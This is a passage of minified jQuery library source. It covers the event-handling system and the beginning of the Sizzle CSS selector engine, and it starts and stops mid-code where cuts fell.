z=/^(?:textarea|input|select)$/i,A=/^([^\.]*)?(?:\.(.+))?$/,B=/(?:^|\s)hover(\.\S+)?\b/,C=/^key/,D=/^(?:mouse|contextmenu)|click/,E=/^(?:focusinfocus|focusoutblur)$/,F=/^(\w*)(?:#([\w\-]+))?(?:\.([\w\-]+))?$/,G=function(
			a){var b=F.exec(a);b&&(b[1]=(b[1]||"").toLowerCase(),b[3]=b[3]&&new RegExp("(?:^|\\s)"+b[3]+"(?:\\s|$)"));return b},H=function(a,b){var c=a.attributes||{};return(!b[1]||a.nodeName.toLowerCase()===b[1])&&(!b[2]||(c.id||{}).value===b[2])&&(!b[3]||b[3].test((c["class"]||{}).value))},I=function(a){return f.event.special.hover?a:a.replace(B,"mouseenter$1 mouseleave$1")};f.event={add:function(a,c,d,e,g){var h,i,j,k,l,m,n,o,p,q,r,s;if(!(a.nodeType===3||a.nodeType===8||!c||!d||!(h=f._data(a)))){d.handler&&(p=d,d=p.handler,g=p.selector),d.guid||(d.guid=f.guid++),j=h.events,j||(h.events=j={}),i=h.handle,i||(h.handle=i=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.dispatch.apply(i.elem,arguments):b},i.elem=a),c=f.trim(I(c)).split(" ");for(k=0;k<c.length;k++){l=A.exec(c[k])||[],m=l[1],n=(l[2]||"").split(".").sort(),s=f.event.special[m]||{},m=(g?s.delegateType:s.bindType)||m,s=f.event.special[m]||{},o=f.extend({type:m,origType:l[1],data:e,handler:d,guid:d.guid,selector:g,quick:g&&G(g),namespace:n.join(".")},p),r=j[m];if(!r){r=j[m]=[],r.delegateCount=0;if(!s.setup||s.setup.call(a,e,n,i)===!1)a.addEventListener?a.addEventListener(m,i,!1):a.attachEvent&&a.attachEvent("on"+m,i)}s.add&&(s.add.call(a,o),o.handler.guid||(o.handler.guid=d.guid)),g?r.splice(r.delegateCount++,0,o):r.push(o),f.event.global[m]=!0}a=null}},global:{},remove:function(a,b,c,d,e){var g=f.hasData(a)&&f._data(a),h,i,j,k,l,m,n,o,p,q,r,s;if(!!g&&!!(o=g.events)){b=f.trim(I(b||"")).split(" ");for(h=0;h<b.length;h++){i=A.exec(b[h])||[],j=k=i[1],l=i[2];if(!j){for(j in o)f.event.remove(a,j+b[h],c,d,!0);continue}p=f.event.special[j]||{},j=(d?p.delegateType:p.bindType)||j,r=o[j]||[],m=r.length,l=l?new RegExp("(^|\\.)"+l.split(".").sort().join("\\.(?:.*\\.)?")+"(\\.|$)"):null;for(n=0;n<r.length;n++)s=r[n],(e||k===s.origType)&&(!c||c.guid===s.guid)&&(!l||l.test(s.namespace))&&(!d||d===s.selector||d==="**"&&s.selector)&&(r.splice(n--,1),s.selector&&r.delegateCount--,p.remove&&p.remove.call(a,s));r.length===0&&m!==r.length&&((!p.teardown||p.teardown.call(a,l)===!1)&&f.removeEvent(a,j,g.handle),delete o[j])}f.isEmptyObject(o)&&(q=g.handle,q&&(q.elem=null),f.removeData(a,["events","handle"],!0))}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){if(!e||e.nodeType!==3&&e.nodeType!==8){var h=c.type||c,i=[],j,k,l,m,n,o,p,q,r,s;if(E.test(h+f.event.triggered))return;h.indexOf("!")>=0&&(h=h.slice(0,-1),k=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if((!e||f.event.customEvent[h])&&!f.event.global[h])return;c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.isTrigger=!0,c.exclusive=k,c.namespace=i.join("."),c.namespace_re=c.namespace?new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)"):null,o=h.indexOf(":")<0?"on"+h:"";if(!e){j=f.cache;for(l in j)j[l].events&&j[l].events[h]&&f.event.trigger(c,d,j[l].handle.elem,!0);return}c.result=b,c.target||(c.target=e),d=d!=null?f.makeArray(d):[],d.unshift(c),p=f.event.special[h]||{};if(p.trigger&&p.trigger.apply(e,d)===!1)return;r=[[e,p.bindType||h]];if(!g&&!p.noBubble&&!f.isWindow(e)){s=p.delegateType||h,m=E.test(s+h)?e:e.parentNode,n=null;for(;m;m=m.parentNode)r.push([m,s]),n=m;n&&n===e.ownerDocument&&r.push([n.defaultView||n.parentWindow||a,s])}for(l=0;l<r.length&&!c.isPropagationStopped();l++)m=r[l][0],c.type=r[l][1],q=(f._data(m,"events")||{})[c.type]&&f._data(m,"handle"),q&&q.apply(m,d),q=o&&m[o],q&&f.acceptData(m)&&q.apply(m,d)===!1&&c.preventDefault();c.type=h,!g&&!c.isDefaultPrevented()&&(!p._default||p._default.apply(e.ownerDocument,d)===!1)&&(h!=="click"||!f.nodeName(e,"a"))&&f.acceptData(e)&&o&&e[h]&&(h!=="focus"&&h!=="blur"||c.target.offsetWidth!==0)&&!f.isWindow(e)&&(n=e[o],n&&(e[o]=null),f.event.triggered=h,e[h](),f.event.triggered=b,n&&(e[o]=n));return c.result}},dispatch:function(c){c=f.event.fix(c||a.event);var d=(f._data(this,"events")||{})[c.type]||[],e=d.delegateCount,g=[].slice.call(arguments,0),h=!c.exclusive&&!c.namespace,i=f.event.special[c.type]||{},j=[],k,l,m,n,o,p,q,r,s,t,u;g[0]=c,c.delegateTarget=this;if(!i.preDispatch||i.preDispatch.call(this,c)!==!1){if(e&&(!c.button||c.type!=="click")){n=f(this),n.context=this.ownerDocument||this;for(m=c.target;m!=this;m=m.parentNode||this)if(m.disabled!==!0){p={},r=[],n[0]=m;for(k=0;k<e;k++)s=d[k],t=s.selector,p[t]===b&&(p[t]=s.quick?H(m,s.quick):n.is(t)),p[t]&&r.push(s);r.length&&j.push({elem:m,matches:r})}}d.length>e&&j.push({elem:this,matches:d.slice(e)});for(k=0;k<j.length&&!c.isPropagationStopped();k++){q=j[k],c.currentTarget=q.elem;for(l=0;l<q.matches.length&&!c.isImmediatePropagationStopped();l++){s=q.matches[l];if(h||!c.namespace&&!s.namespace||c.namespace_re&&c.namespace_re.test(s.namespace))c.data=s.data,c.handleObj=s,o=((f.event.special[s.origType]||{}).handle||s.handler).apply(q.elem,g),o!==b&&(c.result=o,o===!1&&(c.preventDefault(),c.stopPropagation()))}}i.postDispatch&&i.postDispatch.call(this,c);return c.result}},props:"attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){a.which==null&&(a.which=b.charCode!=null?b.charCode:b.keyCode);return a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,d){var e,f,g,h=d.button,i=d.fromElement;a.pageX==null&&d.clientX!=null&&(e=a.target.ownerDocument||c,f=e.documentElement,g=e.body,a.pageX=d.clientX+(f&&f.scrollLeft||g&&g.scrollLeft||0)-(f&&f.clientLeft||g&&g.clientLeft||0),a.pageY=d.clientY+(f&&f.scrollTop||g&&g.scrollTop||0)-(f&&f.clientTop||g&&g.clientTop||0)),!a.relatedTarget&&i&&(a.relatedTarget=i===a.target?d.toElement:i),!a.which&&h!==b&&(a.which=h&1?1:h&2?3:h&4?2:0);return a}},fix:function(a){if(a[f.expando])return a;var d,e,g=a,h=f.event.fixHooks[a.type]||{},i=h.props?this.props.concat(h.props):this.props;a=f.Event(g);for(d=i.length;d;)e=i[--d],a[e]=g[e];a.target||(a.target=g.srcElement||c),a.target.nodeType===3&&(a.target=a.target.parentNode),a.metaKey===b&&(a.metaKey=a.ctrlKey);return h.filter?h.filter(a,g):a},special:{ready:{setup:f.bindReady},load:{noBubble:!0},focus:{delegateType:"focusin"},blur:{delegateType:"focusout"},beforeunload:{setup:function(a,b,c){f.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}},simulate:function(a,b,c,d){var e=f.extend(new f.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?f.event.trigger(e,null,b):f.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},f.event.handle=f.event.dispatch,f.removeEvent=c.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},f.Event=function(a,b){if(!(this instanceof f.Event))return new f.Event(a,b);a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?K:J):this.type=a,b&&f.extend(this,b),this.timeStamp=a&&a.timeStamp||f.now(),this[f.expando]=!0},f.Event.prototype={preventDefault:function(){this.isDefaultPrevented=K;var a=this.originalEvent;!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=K;var a=this.originalEvent;!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=K,this.stopPropagation()},isDefaultPrevented:J,isPropagationStopped:J,isImmediatePropagationStopped:J},f.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){f.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c=this,d=a.relatedTarget,e=a.handleObj,g=e.selector,h;if(!d||d!==c&&!f.contains(c,d))a.type=e.origType,h=e.handler.apply(this,arguments),a.type=b;return h}}}),f.support.submitBubbles||(f.event.special.submit={setup:function(){if(f.nodeName(this,"form"))return!1;f.event.add(this,"click._submit keypress._submit",function(a){var c=a.target,d=f.nodeName(c,"input")||f.nodeName(c,"button")?c.form:b;d&&!d._submit_attached&&(f.event.add(d,"submit._submit",function(a){a._submit_bubble=!0}),d._submit_attached=!0)})},postDispatch:function(a){a._submit_bubble&&(delete a._submit_bubble,this.parentNode&&!a.isTrigger&&f.event.simulate("submit",this.parentNode,a,!0))},teardown:function(){if(f.nodeName(this,"form"))return!1;f.event.remove(this,"._submit")}}),f.support.changeBubbles||(f.event.special.change={setup:function(){if(z.test(this.nodeName)){if(this.type==="checkbox"||this.type==="radio")f.event.add(this,"propertychange._change",function(a){a.originalEvent.propertyName==="checked"&&(this._just_changed=!0)}),f.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1,f.event.simulate("change",this,a,!0))});return!1}f.event.add(this,"beforeactivate._change",function(a){var b=a.target;z.test(b.nodeName)&&!b._change_attached&&(f.event.add(b,"change._change",function(a){this.parentNode&&!a.isSimulated&&!a.isTrigger&&f.event.simulate("change",this.parentNode,a,!0)}),b._change_attached=!0)})},handle:function(a){var b=a.target;if(this!==b||a.isSimulated||a.isTrigger||b.type!=="radio"&&b.type!=="checkbox")return a.handleObj.handler.apply(this,arguments)},teardown:function(){f.event.remove(this,"._change");return z.test(this.nodeName)}}),f.support.focusinBubbles||f.each({focus:"focusin",blur:"focusout"},function(a,b){var d=0,e=function(a){f.event.simulate(b,a.target,f.event.fix(a),!0)};f.event.special[b]={setup:function(){d++===0&&c.addEventListener(a,e,!0)},teardown:function(){--d===0&&c.removeEventListener(a,e,!0)}}}),f.fn.extend({on:function(a,c,d,e,g){var h,i;if(typeof a=="object"){typeof c!="string"&&(d=d||c,c=b);for(i in a)this.on(i,c,d,a[i],g);return this}d==null&&e==null?(e=c,d=c=b):e==null&&(typeof c=="string"?(e=d,d=b):(e=d,d=c,c=b));if(e===!1)e=J;else if(!e)return this;g===1&&(h=e,e=function(a){f().off(a);return h.apply(this,arguments)},e.guid=h.guid||(h.guid=f.guid++));return this.each(function(){f.event.add(this,a,e,d,c)})},one:function(a,b,c,d){return this.on(a,b,c,d,1)},off:function(a,c,d){if(a&&a.preventDefault&&a.handleObj){var e=a.handleObj;f(a.delegateTarget).off(e.namespace?e.origType+"."+e.namespace:e.origType,e.selector,e.handler);return this}if(typeof a=="object"){for(var g in a)this.off(g,c,a[g]);return this}if(c===!1||typeof c=="function")d=c,c=b;d===!1&&(d=J);return this.each(function(){f.event.remove(this,a,d,c)})},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},live:function(a,b,c){f(this.context).on(a,this.selector,b,c);return this},die:function(a,b){f(this.context).off(a,this.selector||"**",b);return this},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return arguments.length==1?this.off(a,"**"):this.off(b,a,c)},trigger:function(a,b){return this.each(function(){f.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0])return f.event.trigger(a,b,this[0],!0)},toggle:function(a){var b=arguments,c=a.guid||f.guid++,d=0,e=function(c){var e=(f._data(this,"lastToggle"+a.guid)||0)%d;f._data(this,"lastToggle"+a.guid,e+1),c.preventDefault();return b[e].apply(this,arguments)||!1};e.guid=c;while(d<b.length)b[d++].guid=c;return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}}),f.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){f.fn[b]=function(a,c){c==null&&(c=a,a=null);return arguments.length>0?this.on(b,null,a,c):this.trigger(b)},f.attrFn&&(f.attrFn[b]=!0),C.test(b)&&(f.event.fixHooks[b]=f.event.keyHooks),D.test(b)&&(f.event.fixHooks[b]=f.event.mouseHooks)}),function(){function x(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}if(j.nodeType===1){g||(j[d]=c,j.sizset=h);if(typeof b!="string"){if(j===b){k=!0;break}}else if(m.filter(b,[j]).length>0){k=j;break}}j=j[a]}e[h]=k}}}function w(a,b,c,e,f,g){for(var h=0,i=e.length;h<i;h++){var j=e[h];if(j){var k=!1;j=j[a];while(j){if(j[d]===c){k=e[j.sizset];break}j.nodeType===1&&!g&&(j[d]=c,j.sizset=h);if(j.nodeName.toLowerCase()===b){k=j;break}j=j[a]}e[h]=k}}}var a=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,d="sizcache"+(Math.random()+"").replace(".",""),e=0,g=Object.prototype.toString,h=!1,i=!0,j=/\\/g,k=/\r\n/g,l=/\W/;[0,0].sort(function(){i=!1;return 0});var m=function(b,d,e,f){e=e||[],d=d||c;var h=d;if(d.nodeType!==1&&d.nodeType!==9)return[];if(!b||typeof b!="string")return e;var i,j,k,l,n,q,r,t,u=!0,v=m.isXML(d),w=[],x=b;do{a.exec(""),i=a.exec(x);if(i){x=i[3],w.push(i[1]);if(i[2]){l=i[3];break}}}while(i);if(w.length>1&&p.exec(b))if(w.length===2&&o.relative[w[0]])j=y(w[0]+w[1],d,f);else{j=o.relative[w[0]]?[d]:m(w.shift(),d);while(w.length)b=w.shift(),o.relative[b]&&(b+=w.shift()),j=y(b,j,f)}else{!f&&w.length>1&&d.nodeType===9&&!v&&o.match.ID.test(w[0])&&!o.match.ID.test(w[w.length-1])&&(n=m.find(w.shift(),d,v),d=n.expr?m.filter(n.expr,n.set)[0]:n.set[0]);if(d){n=f?{expr:w.pop(),set:s(f)}:m.find(w.pop(),w.length===1&&(w[0]==="~"||w[0]==="+")&&d.parentNode?d.parentNode:d,v),j=n.expr?m.filter(n.expr,n.set):n.set,w.length>0?k=s(j):u=!1;while(w.length)q=w.pop(),r=q,o.relative[q]?r=w.pop():q="",r==null&&(r=d),o.relative[q](k,r,v)}else k=w=[]}k||(k=j),k||m.error(q||b);if(g.call(k)==="[object Array]")if(!u)e.push.apply(e,k);else if(d&&d.nodeType===1)for(t=0;k[t]!=null;t++)k[t]&&(k[t]===!0||k[t].nodeType===1&&m.contains(d,k[t]))&&e.push(j[t]);else for(t=0;k[t]!=null;t++)k[t]&&k[t].nodeType===1&&e.push(j[t]);else s(k,e);l&&(m(l,h,e,f),m.uniqueSort(e));return e};m.uniqueSort=function(a){if(u){h=i,a.sort(u);if(h)for(var b=1;b<a.length;b++)a[b]===a[b-1]&&a.splice(b--,1)}return a},m.matches=function(a,b){return m(a,null,null,b)},m.matchesSelector=function(a,b){return m(b,null,null,[a]).length>0},m.find=function(a,b,c){var d,e,f,g,h,i;if(!a)return[];for(e=0,f=o.order.length;e<f;e++){h=o.order[e];if(g=o.leftMatch[h].exec(a)){i=g[1],g.splice(1,1);if(i.substr(i.length-1)!=="\\"){g[1]=(g[1]||"").replace(j,""),d=o.find[h](g,b,c);if(d!=null){a=a.replace(o.match[h],"");break}}}}d||(d=typeof b.getElementsByTagName!="undefined"?b.getElementsByTagName("*"):[]);return{set:d,expr:a}},m.filter=function(a,c,d,e){var f,g,h,i,j,k,l,n,p,q=a,r=[],s=c,t=c&&c[0]&&m.isXML(c[0]);while(a&&c.length){for(h in o.filter)if((f=o.leftMatch[h].exec(a))!=null&&f[2]){k=o.filter[h],l=f[1],g=!1,f.splice(1,1);if(l.substr(l.length-1)==="\\")continue;s===r&&(r=[]);if(o.preFilter[h]){f=o.preFilter[h](f,s,d,r,e,t);if(!f)g=i=!0;else if(f===!0)continue}if(f)for(n=0;(j=s[n])!=null;n++)j&&(i=k(j,f,n,s),p=e^i,d&&i!=null?p?g=!0:s[n]=!1:p&&(r.push(j),g=!0));if(i!==b){d||(s=r),a=a.replace(o.match[h],"");if(!g)return[];break}}if(a===q)if(g==null)m.error(a);else break;q=a}return s},m.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)};var n=m.getText=function(a){var b,c,d=a.nodeType,e="";if(d){if(d===1||d===9||d===11){if(typeof a.textContent=="string")return a.textContent;if(typeof a.innerText=="string")return a.innerText.replace(k,"");for(a=a.firstChild;a;a=a.nextSibling)e+=n(a)}else if(d===3||d===4)return a.nodeValue}else for(b=0;c=a[b];b++)c.nodeType!==8&&(e+=n(c));return e},o=m.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c=typeof b=="string",d=c&&!l.test(b),e=c&&!d;d&&(b=b.toLowerCase());for(var f=0,g=a.length,h;f<g;f++)if(h=a[f]){while((h=h.previousSibling)&&h.nodeType!==1);a[f]=e||h&&h.nodeName.toLowerCase()===b?h||!1:h===b}e&&m.filter(b,a,!0)},">":function(a,b){var c,d=typeof b=="string",e=0,f=a.length;if(d&&!l.test(b)){b=b.toLowerCase();for(;e<f;e++){c=a[e];if(c){var g=c.parentNode;a[e]=g.nodeName.toLowerCase()===b?g:!1}}}else{for(;e<f;e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);d&&m.filter(b,a,!0)}},"":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("parentNode",b,f,a,d,c)},"~":function(a,b,c){var d,f=e++,g=x;typeof b=="string"&&!l.test(b)&&(b=b.toLowerCase(),d=b,g=w),g("previousSibling",b,f,a,d,c)}},find:{ID:function(a,b,c){if(typeof b.getElementById!="undefined"&&!c){var d=b.getElementById(a[1]);return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if(typeof b.getElementsByName!="undefined"){var c=[],d=b.getElementsByName(a[1]);for(var e=0,f=d.length;e<f;e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);return c.length===0?null:c}},TAG:function(a,b){if(typeof b.getElementsByTagName!="undefined")return b.getElementsByTagName(a[1])}},preFilter:{CLASS:function(a,b,c,d,e,f){a=" "+a[1].replace(j,"")+" ";if(f)return a;for(var g=0,h;(h=b[g])!=null;g++)h&&(e^(h.className&&(" "+h.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(h):c&&(b[g]=!1));return!1},ID:function(a){return a[1].replace(j,"")},TAG:function(a,b){return a[1].replace(j,"").toLowerCase()},CHILD:function(a){if(a[1]==="nth"){a[2]||m.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec(a[2]==="even"&&"2n"||a[2]==="odd"&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&m.error(a[0]);a[0]=e++;return a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(j,"");!f&&o.attrMap[g]&&(a[1]=o.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(j,""),a[2]==="~="&&(a[4]=" "+a[4]+" ");return a},PSEUDO:function(b,c,d,e,f){if(b[1]==="not")if((a.exec(b[3])||"").length>1||/^\w/.test(b[3]))b[3]=m(b[3],null,null,c);else{var g=m.filter(b[3],c,d,!0^f);d||e.push.apply(e,g);return!1}else if(o.match.POS.test(b[0])||o.match.CHILD.test(b[0]))return!0;return b},POS:function(a){a.unshift(!0);return a}},filters:{enabled:function(a){return a.disabled===!1&&a.type!=="hidden"},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){a.parentNode&&a.parentNode.selectedIndex;return a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!m(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;return a.nodeName.toLowerCase()==="input"&&"text"===c&&(b===c||b===null)},radio:function(a){return a.nodeName.toLowerCase()==="input"&&"radio"===a.type},checkbox:function(a){return a.nodeName.toLowerCase()==="input"&&"checkbox"===a.type},file:function(a){return a.nodeName.toLowerCase()==="input"&&"file"===a.type},password:function(a){return a.nodeName.toLowerCase()==="input"&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"submit"===a.type},image:function(a){return a.nodeName.toLowerCase()==="input"&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();return(b==="input"||b==="button")&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();return b==="input"&&"button"===a.type||b==="button"},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return b===0},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=o.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||n([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}m.error(e)},CHILD:function(a,b){var c,e,f,g,h,i,j,k=b[1],l=a;switch(k){case"only":case"first":while(l=l.previousSibling)if(l.nodeType===1)return!1;if(k==="first")return!0;l=a;case"last":while(l=l.nextSibling)if(l.nodeType===1)return!1;return!0;case"nth":c=b[2],e=b[3];if(c===1&&e===0)return!0;f=b[0],g=a.parentNode;if(g&&(g[d]!==f||!a.nodeIndex)){i=0;for(l=g.firstChild;l;l=l.nextSibling)l.nodeType===1&&(l.nodeIndex=++i);g[d]=f}j=a.nodeIndex-e;return c===0?j===0:j%c===0&&j/c>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||!!a.nodeName&&a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=m.attr?m.attr(a,c):o.attrHandle[c]?o.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":!f&&m.attr?d!=null:f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=o.setFilters[e];if(f)return f(a,c,b,d)}}},p=o.match.POS,q=function(a,b){return"\\"+(b-0+1)};for(var r in o.match)o.match[r]=new RegExp(o.match[r].source+/(?![^\[]*\])(?![^\(]*\))/.source),o.leftMatch[r]=new RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[r].source.replace(/\\(\d+)/g,q));o.match.globalPOS=p;var s=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(t){s=function(a,b){var c=0,d=b||[];if(g.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var e=a.length;c<e;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var u,v;c.documentElement.compareDocumentPosition?u=function(a,b){if(a===b){h=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(u=function(a,b){if(a===b){h=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],g=a.parentNode,i=b.parentNode,j=g;if(g===i)return v(a,b);if(!g)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return v(e[k],f[k]);return k===c?v(a,f[k],-1):v(e[k],b,1)},v=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(o.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},o.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(o.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(o.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=m,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){m=function(b,e,f,g){e=e||c;if(!g&&!m.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return s(e.getElementsByTagName(b),f);if(h[2]&&o.find.CLASS&&e.getElementsByClassName)return s(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return s([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return s([],f);if(i.id===h[3])return s([i],f)}try{return s(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var k=e,l=e.getAttribute("id"),n=l||d,p=e.parentNode,q=/^\s*[+~]/.test(b);l?n=n.replace(/'/g,"\\$&"):e.setAttribute("id",n),q&&p&&(e=e.parentNode);try{if(!q||p)return s(e.querySelectorAll("[id='"+n+"'] "+b),f)}catch(r){}finally{l||k.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)m[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}m.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!m.isXML(a))try{if(e||!o.match.PSEUDO.test(c)&&!/!=/.test(c)){var 